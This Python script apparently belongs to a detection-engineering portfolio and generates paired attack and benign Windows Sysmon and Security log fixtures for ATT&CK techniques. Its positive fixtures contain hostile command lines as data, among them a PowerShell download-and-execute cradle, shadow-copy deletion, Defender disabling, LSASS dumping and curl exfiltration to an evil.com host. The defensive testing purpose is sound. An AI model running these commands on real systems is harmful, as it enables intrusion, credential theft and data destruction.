#!/usr/bin/env python3
"""
Detection Engineering Portfolio: Fixture Generator
Reference: PROJECT_PLAN.md - Week 3 Deliverable (20 positive + 20 negative log fixtures)

Generates 20 positive attack log fixtures (tests/fixtures/T<ID>_positive.json)
and 20 negative benign log fixtures (tests/fixtures/T<ID>_negative.json).
"""

import json
import os

FIXTURES_DIR = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "tests", "fixtures")

FIXTURES_DATA = {
    # -------------------------------------------------------------------------
    # Scenario A: Active Directory Intrusion Chain
    # -------------------------------------------------------------------------
    "T1566.001": {
        "title": "Spearphishing Attachment",
        "positive": {
            "EventID": 11,
            "Channel": "Microsoft-Windows-Sysmon/Operational",
            "UtcTime": "2026-10-19T04:15:00.000Z",
            "Computer": "WIN10-CLIENT01.corp.local",
            "EventData": {
                "RuleName": "technique_id=T1566.001,technique_name=Spearphishing Attachment",
                "UtcTime": "2026-10-19T04:15:00.000Z",
                "ProcessId": 4820,
                "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE",
                "TargetFilename": "C:\\Users\\targetuser\\Downloads\\urgent_invoice_payload.vbs",
                "CreationUtcTime": "2026-10-19T04:15:00.000Z",
                "User": "CORP\\targetuser"
            }
        },
        "negative": {
            "EventID": 11,
            "Channel": "Microsoft-Windows-Sysmon/Operational",
            "UtcTime": "2026-10-19T04:15:00.000Z",
            "Computer": "WIN10-CLIENT01.corp.local",
            "EventData": {
                "RuleName": "-",
                "UtcTime": "2026-10-19T04:15:00.000Z",
                "ProcessId": 3120,
                "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
                "TargetFilename": "C:\\Users\\targetuser\\Downloads\\quarterly_report.pdf",
                "CreationUtcTime": "2026-10-19T04:15:00.000Z",
                "User": "CORP\\targetuser"
            }
        }
    },

    "T1204.002": {
        "title": "User Execution: Malicious File",
        "positive": {
            "EventID": 1,
            "Channel": "Microsoft-Windows-Sysmon/Operational",
            "UtcTime": "2026-10-19T04:15:15.000Z",
            "Computer": "WIN10-CLIENT01.corp.local",
            "EventData": {
                "RuleName": "technique_id=T1204.002,technique_name=Malicious File Execution",
                "UtcTime": "2026-10-19T04:15:15.000Z",
                "ProcessId": 5912,
                "Image": "C:\\Windows\\System32\\wscript.exe",
                "CommandLine": "wscript.exe \"C:\\Users\\targetuser\\Downloads\\urgent_invoice_payload.vbs\"",
                "CurrentDirectory": "C:\\Users\\targetuser\\Downloads\\",
                "User": "CORP\\targetuser",
                "ParentProcessId": 2840,
                "ParentImage": "C:\\Windows\\explorer.exe",
                "ParentCommandLine": "C:\\Windows\\Explorer.EXE"
            }
        },
        "negative": {
            "EventID": 1,
            "Channel": "Microsoft-Windows-Sysmon/Operational",
            "UtcTime": "2026-10-19T04:15:15.000Z",
            "Computer": "WIN10-CLIENT01.corp.local",
            "EventData": {
                "RuleName": "-",
                "UtcTime": "2026-10-19T04:15:15.000Z",
                "ProcessId": 2104,
                "Image": "C:\\Program Files\\Adobe\\Acrobat DC\\Acrobat\\Acrobat.exe",
                "CommandLine": "\"C:\\Program Files\\Adobe\\Acrobat DC\\Acrobat\\Acrobat.exe\" \"C:\\Users\\targetuser\\Documents\\contract.pdf\"",
                "CurrentDirectory": "C:\\Users\\targetuser\\Documents\\",
                "User": "CORP\\targetuser",
                "ParentProcessId": 2840,
                "ParentImage": "C:\\Windows\\explorer.exe",
                "ParentCommandLine": "C:\\Windows\\Explorer.EXE"
            }
        }
    },

    "T1059.001": {
        "title": "PowerShell Execution",
        "positive": {
            "EventID": 4104,
            "Channel": "Microsoft-Windows-PowerShell/Operational",
            "UtcTime": "2026-10-19T04:15:30.000Z",
            "Computer": "WIN10-CLIENT01.corp.local",
            "EventData": {
                "ScriptBlockText": "$client = New-Object System.Net.WebClient; $payload = $client.DownloadString('http://192.168.56.1/beacon.ps1'); IEX $payload",
                "ScriptBlockId": "a1b2c3d4-e5f6-7890-abcd-ef1234567890",
                "MessageNumber": 1,
                "MessageTotal": 1,
                "Path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
            }
        },
        "negative": {
            "EventID": 4104,
            "Channel": "Microsoft-Windows-PowerShell/Operational",
            "UtcTime": "2026-10-19T04:15:30.000Z",
            "Computer": "WIN10-CLIENT01.corp.local",
            "EventData": {
                "ScriptBlockText": "Get-Process | Where-Object { $_.CPU -gt 10 } | Select-Object Name, CPU, WorkingSet",
                "ScriptBlockId": "f9e8d7c6-b5a4-3210-fedc-ba0987654321",
                "MessageNumber": 1,
                "MessageTotal": 1,
                "Path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
            }
        }
    },

    "T1218.011": {
        "title": "Signed Binary Proxy: Rundll32",
        "positive": {
            "EventID": 1,
            "Channel": "Microsoft-Windows-Sysmon/Operational",
            "UtcTime": "2026-10-19T04:15:45.000Z",
            "Computer": "WIN10-CLIENT01.corp.local",
            "EventData": {
                "RuleName": "technique_id=T1218.011,technique_name=Rundll32 Proxy",
                "UtcTime": "2026-10-19T04:15:45.000Z",
                "ProcessId": 6120,
                "Image": "C:\\Windows\\System32\\rundll32.exe",
                "CommandLine": "rundll32.exe C:\\Users\\Public\\malware.dll,DllRegisterServer",
                "CurrentDirectory": "C:\\Users\\Public\\",
                "User": "CORP\\targetuser",
                "ParentProcessId": 5912,
                "ParentImage": "C:\\Windows\\System32\\wscript.exe",
                "ParentCommandLine": "wscript.exe C:\\Users\\targetuser\\Downloads\\urgent_invoice_payload.vbs"
            }
        },
        "negative": {
            "EventID": 1,
            "Channel": "Microsoft-Windows-Sysmon/Operational",
            "UtcTime": "2026-10-19T04:15:45.000Z",
            "Computer": "WIN10-CLIENT01.corp.local",
            "EventData": {
                "RuleName": "-",
                "UtcTime": "2026-10-19T04:15:45.000Z",
                "ProcessId": 3204,
                "Image": "C:\\Windows\\System32\\rundll32.exe",
                "CommandLine": "rundll32.exe shell32.dll,Control_RunDLL timedate.cpl",
                "CurrentDirectory": "C:\\Windows\\system32\\",
                "User": "CORP\\targetuser",
                "ParentProcessId": 2840,
                "ParentImage": "C:\\Windows\\explorer.exe",
                "ParentCommandLine": "C:\\Windows\\Explorer.EXE"
            }
        }
    },

    "T1055.012": {
        "title": "Process Injection: Process Hollowing",
        "positive": {
            "EventID": 8,
            "Channel": "Microsoft-Windows-Sysmon/Operational",
            "UtcTime": "2026-10-19T04:16:00.000Z",
            "Computer": "WIN10-CLIENT01.corp.local",
            "EventData": {
                "RuleName": "technique_id=T1055.012,technique_name=Process Hollowing",
                "UtcTime": "2026-10-19T04:16:00.000Z",
                "SourceProcessId": 6120,
                "SourceImage": "C:\\Windows\\System32\\rundll32.exe",
                "TargetProcessId": 1420,
                "TargetImage": "C:\\Windows\\System32\\svchost.exe",
                "NewThreadId": 8844,
                "StartAddress": "0x00007FF728A11000",
                "StartFunction": "EntryPoint"
            }
        },
        "negative": {
            "EventID": 8,
            "Channel": "Microsoft-Windows-Sysmon/Operational",
            "UtcTime": "2026-10-19T04:16:00.000Z",
            "Computer": "WIN10-CLIENT01.corp.local",
            "EventData": {
                "RuleName": "-",
                "UtcTime": "2026-10-19T04:16:00.000Z",
                "SourceProcessId": 680,
                "SourceImage": "C:\\Windows\\System32\\csrss.exe",
                "TargetProcessId": 1420,
                "TargetImage": "C:\\Windows\\System32\\svchost.exe",
                "NewThreadId": 2104,
                "StartAddress": "0x00007FF9B4201000",
                "StartFunction": "CtrlRoutine"
            }
        }
    },

    "T1003.001": {
        "title": "OS Credential Dumping: LSASS Memory",
        "positive": {
            "EventID": 10,
            "Channel": "Microsoft-Windows-Sysmon/Operational",
            "UtcTime": "2026-10-19T04:16:15.000Z",
            "Computer": "WIN10-CLIENT01.corp.local",
            "EventData": {
                "RuleName": "technique_id=T1003.001,technique_name=LSASS Memory Dump",
                "UtcTime": "2026-10-19T04:16:15.000Z",
                "SourceProcessId": 7240,
                "SourceImage": "C:\\Users\\Public\\procdump64.exe",
                "TargetProcessId": 684,
                "TargetImage": "C:\\Windows\\System32\\lsass.exe",
                "GrantedAccess": "0x1010",
                "CallTrace": "C:\\Windows\\SYSTEM32\\ntdll.dll+9d424|C:\\Windows\\System32\\KERNELBASE.dll+27112"
            }
        },
        "negative": {
            "EventID": 10,
            "Channel": "Microsoft-Windows-Sysmon/Operational",
            "UtcTime": "2026-10-19T04:16:15.000Z",
            "Computer": "WIN10-CLIENT01.corp.local",
            "EventData": {
                "RuleName": "-",
                "UtcTime": "2026-10-19T04:16:15.000Z",
                "SourceProcessId": 1420,
                "SourceImage": "C:\\Windows\\System32\\svchost.exe",
                "TargetProcessId": 684,
                "TargetImage": "C:\\Windows\\System32\\lsass.exe",
                "GrantedAccess": "0x1400",
                "CallTrace": "C:\\Windows\\SYSTEM32\\ntdll.dll+9d424|C:\\Windows\\System32\\sspicli.dll+5140"
            }
        }
    },

    "T1003.006": {
        "title": "Credential Dumping: DCSync",
        "positive": {
            "EventID": 4662,
            "Channel": "Security",
            "UtcTime": "2026-10-19T04:16:30.000Z",
            "Computer": "DC01.corp.local",
            "EventData": {
                "SubjectUserName": "targetuser",
                "SubjectDomainName": "CORP",
                "ObjectServer": "DS",
                "ObjectType": "%{bf9679f0-0de6-11d0-a285-00aa003049e2}",
                "ObjectName": "CN=Configuration,DC=corp,DC=local",
                "AccessMask": "0x100",
                "Properties": "{1131f6aa-9c07-11d1-f79f-00c04fc2dcd2}"
            }
        },
        "negative": {
            "EventID": 4662,
            "Channel": "Security",
            "UtcTime": "2026-10-19T04:16:30.000Z",
            "Computer": "DC01.corp.local",
            "EventData": {
                "SubjectUserName": "DC01$",
                "SubjectDomainName": "CORP",
                "ObjectServer": "DS",
                "ObjectType": "%{bf9679f0-0de6-11d0-a285-00aa003049e2}",
                "ObjectName": "CN=Configuration,DC=corp,DC=local",
                "AccessMask": "0x10",
                "Properties": "{bf9679a0-0de6-11d0-a285-00aa003049e2}"
            }
        }
    },

    "T1021.002": {
        "title": "Remote Services: SMB/Windows Admin Shares",
        "positive": {
            "EventID": 5140,
            "Channel": "Security",
            "UtcTime": "2026-10-19T04:16:45.000Z",
            "Computer": "DC01.corp.local",
            "EventData": {
                "SubjectUserName": "corpadmin",
                "SubjectDomainName": "CORP",
                "ShareName": "\\\\*\\ADMIN$",
                "ShareLocalPath": "C:\\Windows",
                "IpAddress": "192.168.56.20",
                "IpPort": "51240"
            }
        },
        "negative": {
            "EventID": 5140,
            "Channel": "Security",
            "UtcTime": "2026-10-19T04:16:45.000Z",
            "Computer": "DC01.corp.local",
            "EventData": {
                "SubjectUserName": "jdoe",
                "SubjectDomainName": "CORP",
                "ShareName": "\\\\*\\SYSVOL",
                "ShareLocalPath": "C:\\Windows\\SYSVOL\\sysvol",
                "IpAddress": "192.168.56.20",
                "IpPort": "49880"
            }
        }
    },

    "T1087.002": {
        "title": "Account Discovery: Domain Account",
        "positive": {
            "EventID": 1,
            "Channel": "Microsoft-Windows-Sysmon/Operational",
            "UtcTime": "2026-10-19T04:17:00.000Z",
            "Computer": "WIN10-CLIENT01.corp.local",
            "EventData": {
                "RuleName": "technique_id=T1087.002,technique_name=Domain Account Recon",
                "UtcTime": "2026-10-19T04:17:00.000Z",
                "ProcessId": 8104,
                "Image": "C:\\Windows\\System32\\net.exe",
                "CommandLine": "net group \"Domain Admins\" /domain",
                "CurrentDirectory": "C:\\Users\\Public\\",
                "User": "CORP\\targetuser",
                "ParentProcessId": 4120,
                "ParentImage": "C:\\Windows\\System32\\cmd.exe",
                "ParentCommandLine": "cmd.exe"
            }
        },
        "negative": {
            "EventID": 1,
            "Channel": "Microsoft-Windows-Sysmon/Operational",
            "UtcTime": "2026-10-19T04:17:00.000Z",
            "Computer": "WIN10-CLIENT01.corp.local",
            "EventData": {
                "RuleName": "-",
                "UtcTime": "2026-10-19T04:17:00.000Z",
                "ProcessId": 2980,
                "Image": "C:\\Windows\\System32\\whoami.exe",
                "CommandLine": "whoami",
                "CurrentDirectory": "C:\\Users\\targetuser\\",
                "User": "CORP\\targetuser",
                "ParentProcessId": 4120,
                "ParentImage": "C:\\Windows\\System32\\cmd.exe",
                "ParentCommandLine": "cmd.exe"
            }
        }
    },

    "T1482": {
        "title": "Domain Trust Discovery",
        "positive": {
            "EventID": 1,
            "Channel": "Microsoft-Windows-Sysmon/Operational",
            "UtcTime": "2026-10-19T04:17:15.000Z",
            "Computer": "WIN10-CLIENT01.corp.local",
            "EventData": {
                "RuleName": "technique_id=T1482,technique_name=Domain Trust Discovery",
                "UtcTime": "2026-10-19T04:17:15.000Z",
                "ProcessId": 8290,
                "Image": "C:\\Windows\\System32\\nltest.exe",
                "CommandLine": "nltest /domain_trusts",
                "CurrentDirectory": "C:\\Users\\Public\\",
                "User": "CORP\\targetuser",
                "ParentProcessId": 4120,
                "ParentImage": "C:\\Windows\\System32\\cmd.exe",
                "ParentCommandLine": "cmd.exe"
            }
        },
        "negative": {
            "EventID": 1,
            "Channel": "Microsoft-Windows-Sysmon/Operational",
            "UtcTime": "2026-10-19T04:17:15.000Z",
            "Computer": "WIN10-CLIENT01.corp.local",
            "EventData": {
                "RuleName": "-",
                "UtcTime": "2026-10-19T04:17:15.000Z",
                "ProcessId": 3100,
                "Image": "C:\\Windows\\System32\\ipconfig.exe",
                "CommandLine": "ipconfig /all",
                "CurrentDirectory": "C:\\Windows\\system32\\",
                "User": "CORP\\targetuser",
                "ParentProcessId": 4120,
                "ParentImage": "C:\\Windows\\System32\\cmd.exe",
                "ParentCommandLine": "cmd.exe"
            }
        }
    },

    # -------------------------------------------------------------------------
    # Scenario B: Ransomware Precursor Chain
    # -------------------------------------------------------------------------
    "T1078.002": {
        "title": "Valid Accounts: Domain Accounts",
        "positive": {
            "EventID": 4624,
            "Channel": "Security",
            "UtcTime": "2026-10-19T04:20:00.000Z",
            "Computer": "DC01.corp.local",
            "EventData": {
                "TargetUserName": "corpadmin",
                "TargetDomainName": "CORP",
                "LogonType": 3,
                "LogonProcessName": "NtLmSsp",
                "AuthenticationPackageName": "NTLM",
                "WorkstationName": "ATTACKER-KALI",
                "IpAddress": "192.168.56.1",
                "IpPort": "44320",
                "ProcessName": "-"
            }
        },
        "negative": {
            "EventID": 4624,
            "Channel": "Security",
            "UtcTime": "2026-10-19T04:20:00.000Z",
            "Computer": "WIN10-CLIENT01.corp.local",
            "EventData": {
                "TargetUserName": "targetuser",
                "TargetDomainName": "CORP",
                "LogonType": 2,
                "LogonProcessName": "User32",
                "AuthenticationPackageName": "Negotiate",
                "WorkstationName": "WIN10-CLIENT01",
                "IpAddress": "127.0.0.1",
                "IpPort": "0",
                "ProcessName": "C:\\Windows\\System32\\winlogon.exe"
            }
        }
    },

    "T1021.001": {
        "title": "Remote Services: Remote Desktop Protocol",
        "positive": {
            "EventID": 4624,
            "Channel": "Security",
            "UtcTime": "2026-10-19T04:20:15.000Z",
            "Computer": "WIN10-CLIENT01.corp.local",
            "EventData": {
                "TargetUserName": "corpadmin",
                "TargetDomainName": "CORP",
                "LogonType": 10,
                "LogonProcessName": "User32",
                "AuthenticationPackageName": "Negotiate",
                "WorkstationName": "KALI",
                "IpAddress": "192.168.56.1",
                "IpPort": "53120",
                "ProcessName": "C:\\Windows\\System32\\winlogon.exe"
            }
        },
        "negative": {
            "EventID": 4624,
            "Channel": "Security",
            "UtcTime": "2026-10-19T04:20:15.000Z",
            "Computer": "WIN10-CLIENT01.corp.local",
            "EventData": {
                "TargetUserName": "targetuser",
                "TargetDomainName": "CORP",
                "LogonType": 2,
                "LogonProcessName": "User32",
                "AuthenticationPackageName": "Negotiate",
                "WorkstationName": "WIN10-CLIENT01",
                "IpAddress": "127.0.0.1",
                "IpPort": "0",
                "ProcessName": "C:\\Windows\\System32\\winlogon.exe"
            }
        }
    },

    "T1053.005": {
        "title": "Scheduled Task Creation",
        "positive": {
            "EventID": 4698,
            "Channel": "Security",
            "UtcTime": "2026-10-19T04:20:30.000Z",
            "Computer": "WIN10-CLIENT01.corp.local",
            "EventData": {
                "SubjectUserName": "corpadmin",
                "SubjectDomainName": "CORP",
                "TaskName": "\\CorpMaintenanceTask",
                "TaskContent": "<?xml version=\"1.0\" encoding=\"UTF-16\"?><Task><Actions><Exec><Command>powershell.exe</Command><Arguments>-WindowStyle Hidden -Enc aQB4ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAA...</Arguments></Exec></Actions></Task>"
            }
        },
        "negative": {
            "EventID": 4698,
            "Channel": "Security",
            "UtcTime": "2026-10-19T04:20:30.000Z",
            "Computer": "WIN10-CLIENT01.corp.local",
            "EventData": {
                "SubjectUserName": "SYSTEM",
                "SubjectDomainName": "NT AUTHORITY",
                "TaskName": "\\Microsoft\\Windows\\WindowsUpdate\\Scheduled Start",
                "TaskContent": "<?xml version=\"1.0\" encoding=\"UTF-16\"?><Task><Actions><Exec><Command>C:\\Windows\\system32\\usoclient.exe</Command><Arguments>StartScan</Arguments></Exec></Actions></Task>"
            }
        }
    },

    "T1547.001": {
        "title": "Registry Run Keys Persistence",
        "positive": {
            "EventID": 13,
            "Channel": "Microsoft-Windows-Sysmon/Operational",
            "UtcTime": "2026-10-19T04:20:45.000Z",
            "Computer": "WIN10-CLIENT01.corp.local",
            "EventData": {
                "RuleName": "technique_id=T1547.001,technique_name=Run Key Persistence",
                "UtcTime": "2026-10-19T04:20:45.000Z",
                "ProcessId": 4120,
                "EventType": "SetValue",
                "Image": "C:\\Windows\\System32\\reg.exe",
                "TargetObject": "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\SecurityHealthServiceUpdate",
                "Details": "C:\\Users\\Public\\updater.exe",
                "User": "CORP\\corpadmin"
            }
        },
        "negative": {
            "EventID": 13,
            "Channel": "Microsoft-Windows-Sysmon/Operational",
            "UtcTime": "2026-10-19T04:20:45.000Z",
            "Computer": "WIN10-CLIENT01.corp.local",
            "EventData": {
                "RuleName": "-",
                "UtcTime": "2026-10-19T04:20:45.000Z",
                "ProcessId": 1420,
                "EventType": "SetValue",
                "Image": "C:\\Windows\\System32\\svchost.exe",
                "TargetObject": "HKLM\\System\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\NtpClient\\SpecialPollInterval",
                "Details": "3600",
                "User": "NT AUTHORITY\\LOCAL SERVICE"
            }
        }
    },

    "T1490": {
        "title": "Inhibit System Recovery",
        "positive": {
            "EventID": 1,
            "Channel": "Microsoft-Windows-Sysmon/Operational",
            "UtcTime": "2026-10-19T04:21:00.000Z",
            "Computer": "WIN10-CLIENT01.corp.local",
            "EventData": {
                "RuleName": "technique_id=T1490,technique_name=Inhibit Recovery",
                "UtcTime": "2026-10-19T04:21:00.000Z",
                "ProcessId": 9120,
                "Image": "C:\\Windows\\System32\\vssadmin.exe",
                "CommandLine": "vssadmin.exe delete shadows /all /quiet",
                "CurrentDirectory": "C:\\Windows\\system32\\",
                "User": "CORP\\corpadmin",
                "ParentProcessId": 4120,
                "ParentImage": "C:\\Windows\\System32\\cmd.exe",
                "ParentCommandLine": "cmd.exe"
            }
        },
        "negative": {
            "EventID": 1,
            "Channel": "Microsoft-Windows-Sysmon/Operational",
            "UtcTime": "2026-10-19T04:21:00.000Z",
            "Computer": "WIN10-CLIENT01.corp.local",
            "EventData": {
                "RuleName": "-",
                "UtcTime": "2026-10-19T04:21:00.000Z",
                "ProcessId": 5210,
                "Image": "C:\\Windows\\System32\\vssadmin.exe",
                "CommandLine": "vssadmin.exe list shadows",
                "CurrentDirectory": "C:\\Windows\\system32\\",
                "User": "CORP\\corpadmin",
                "ParentProcessId": 4120,
                "ParentImage": "C:\\Windows\\System32\\cmd.exe",
                "ParentCommandLine": "cmd.exe"
            }
        }
    },

    "T1562.001": {
        "title": "Impair Defenses: Disable Windows Defender",
        "positive": {
            "EventID": 4104,
            "Channel": "Microsoft-Windows-PowerShell/Operational",
            "UtcTime": "2026-10-19T04:21:15.000Z",
            "Computer": "WIN10-CLIENT01.corp.local",
            "EventData": {
                "ScriptBlockText": "Set-MpPreference -DisableRealtimeMonitoring $true -DisableBehaviorMonitoring $true -DisableScriptScanning $true",
                "ScriptBlockId": "33445566-7788-99aa-bbcc-ddeeff001122",
                "MessageNumber": 1,
                "MessageTotal": 1,
                "Path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
            }
        },
        "negative": {
            "EventID": 4104,
            "Channel": "Microsoft-Windows-PowerShell/Operational",
            "UtcTime": "2026-10-19T04:21:15.000Z",
            "Computer": "WIN10-CLIENT01.corp.local",
            "EventData": {
                "ScriptBlockText": "Get-MpComputerStatus | Select-Object RealTimeProtectionEnabled, AntivirusEnabled",
                "ScriptBlockId": "11223344-5566-7788-99aa-bbccddeeff00",
                "MessageNumber": 1,
                "MessageTotal": 1,
                "Path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
            }
        }
    },

    "T1486": {
        "title": "Data Encrypted for Impact",
        "positive": {
            "EventID": 11,
            "Channel": "Microsoft-Windows-Sysmon/Operational",
            "UtcTime": "2026-10-19T04:21:30.000Z",
            "Computer": "WIN10-CLIENT01.corp.local",
            "EventData": {
                "RuleName": "technique_id=T1486,technique_name=Data Encrypted for Impact",
                "UtcTime": "2026-10-19T04:21:30.000Z",
                "ProcessId": 9840,
                "Image": "C:\\Users\\Public\\ransomware.exe",
                "TargetFilename": "C:\\Users\\targetuser\\Documents\\financials_2026.docx.lockbit",
                "CreationUtcTime": "2026-10-19T04:21:30.000Z",
                "User": "CORP\\targetuser"
            }
        },
        "negative": {
            "EventID": 11,
            "Channel": "Microsoft-Windows-Sysmon/Operational",
            "UtcTime": "2026-10-19T04:21:30.000Z",
            "Computer": "WIN10-CLIENT01.corp.local",
            "EventData": {
                "RuleName": "-",
                "UtcTime": "2026-10-19T04:21:30.000Z",
                "ProcessId": 4120,
                "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
                "TargetFilename": "C:\\Users\\targetuser\\Documents\\financials_2026.docx",
                "CreationUtcTime": "2026-10-19T04:21:30.000Z",
                "User": "CORP\\targetuser"
            }
        }
    },

    "T1041": {
        "title": "Exfiltration Over C2 Channel",
        "positive": {
            "EventID": 3,
            "Channel": "Microsoft-Windows-Sysmon/Operational",
            "UtcTime": "2026-10-19T04:21:45.000Z",
            "Computer": "WIN10-CLIENT01.corp.local",
            "EventData": {
                "RuleName": "technique_id=T1041,technique_name=Exfiltration Over C2",
                "UtcTime": "2026-10-19T04:21:45.000Z",
                "ProcessId": 9912,
                "Image": "C:\\Windows\\System32\\curl.exe",
                "User": "CORP\\targetuser",
                "Protocol": "tcp",
                "Initiated": "true",
                "SourceIp": "192.168.56.20",
                "SourcePort": 54120,
                "DestinationIp": "192.168.56.1",
                "DestinationPort": 8080,
                "DestinationHostname": "c2-collector.evil.com"
            }
        },
        "negative": {
            "EventID": 3,
            "Channel": "Microsoft-Windows-Sysmon/Operational",
            "UtcTime": "2026-10-19T04:21:45.000Z",
            "Computer": "WIN10-CLIENT01.corp.local",
            "EventData": {
                "RuleName": "-",
                "UtcTime": "2026-10-19T04:21:45.000Z",
                "ProcessId": 3120,
                "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
                "User": "CORP\\targetuser",
                "Protocol": "tcp",
                "Initiated": "true",
                "SourceIp": "192.168.56.20",
                "SourcePort": 52140,
                "DestinationIp": "142.250.190.46",
                "DestinationPort": 443,
                "DestinationHostname": "www.google.com"
            }
        }
    },

    "T1027": {
        "title": "Obfuscated Files or Information",
        "positive": {
            "EventID": 4104,
            "Channel": "Microsoft-Windows-PowerShell/Operational",
            "UtcTime": "2026-10-19T04:22:00.000Z",
            "Computer": "WIN10-CLIENT01.corp.local",
            "EventData": {
                "ScriptBlockText": "$encoded = 'V3JpdGUtSG9zdCAnT2JmdXNjYXRlZCBjb21tYW5kJw=='; [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($encoded)) | IEX",
                "ScriptBlockId": "44556677-8899-aabb-ccdd-eeff00112233",
                "MessageNumber": 1,
                "MessageTotal": 1,
                "Path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
            }
        },
        "negative": {
            "EventID": 4104,
            "Channel": "Microsoft-Windows-PowerShell/Operational",
            "UtcTime": "2026-10-19T04:22:00.000Z",
            "Computer": "WIN10-CLIENT01.corp.local",
            "EventData": {
                "ScriptBlockText": "Write-Output 'Executing cleartext standard system health check...'",
                "ScriptBlockId": "55667788-99aa-bbcc-ddee-ff0011223344",
                "MessageNumber": 1,
                "MessageTotal": 1,
                "Path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
            }
        }
    },

    "T1047": {
        "title": "Windows Management Instrumentation",
        "positive": {
            "EventID": 1,
            "Channel": "Microsoft-Windows-Sysmon/Operational",
            "UtcTime": "2026-10-19T04:22:15.000Z",
            "Computer": "WIN10-CLIENT01.corp.local",
            "EventData": {
                "RuleName": "technique_id=T1047,technique_name=WMI Execution",
                "UtcTime": "2026-10-19T04:22:15.000Z",
                "ProcessId": 10450,
                "Image": "C:\\Windows\\System32\\wbem\\WMIC.exe",
                "CommandLine": "wmic.exe process call create \"cmd.exe /c whoami > C:\\Users\\Public\\wmi_out.txt\"",
                "CurrentDirectory": "C:\\Windows\\system32\\",
                "User": "CORP\\corpadmin",
                "ParentProcessId": 4120,
                "ParentImage": "C:\\Windows\\System32\\cmd.exe",
                "ParentCommandLine": "cmd.exe"
            }
        },
        "negative": {
            "EventID": 1,
            "Channel": "Microsoft-Windows-Sysmon/Operational",
            "UtcTime": "2026-10-19T04:22:15.000Z",
            "Computer": "WIN10-CLIENT01.corp.local",
            "EventData": {
                "RuleName": "-",
                "UtcTime": "2026-10-19T04:22:15.000Z",
                "ProcessId": 7410,
                "Image": "C:\\Windows\\System32\\wbem\\WMIC.exe",
                "CommandLine": "wmic.exe os get Caption,Version,OSArchitecture",
                "CurrentDirectory": "C:\\Windows\\system32\\",
                "User": "CORP\\targetuser",
                "ParentProcessId": 4120,
                "ParentImage": "C:\\Windows\\System32\\cmd.exe",
                "ParentCommandLine": "cmd.exe"
            }
        }
    }
}


def main():
    os.makedirs(FIXTURES_DIR, exist_ok=True)
    generated_pos = 0
    generated_neg = 0

    for tid, data in FIXTURES_DATA.items():
        pos_file = os.path.join(FIXTURES_DIR, f"{tid}_positive.json")
        neg_file = os.path.join(FIXTURES_DIR, f"{tid}_negative.json")

        with open(pos_file, "w", encoding="utf-8") as pf:
            json.dump(data["positive"], pf, indent=2)
            generated_pos += 1

        with open(neg_file, "w", encoding="utf-8") as nf:
            json.dump(data["negative"], nf, indent=2)
            generated_neg += 1

    print(f"[+] Successfully generated test fixtures in {FIXTURES_DIR}:")
    print(f"    - Positive fixtures: {generated_pos} files")
    print(f"    - Negative fixtures: {generated_neg} files")
    print(f"    - Total sub-techniques covered: {len(FIXTURES_DATA)}")


if __name__ == "__main__":
    main()
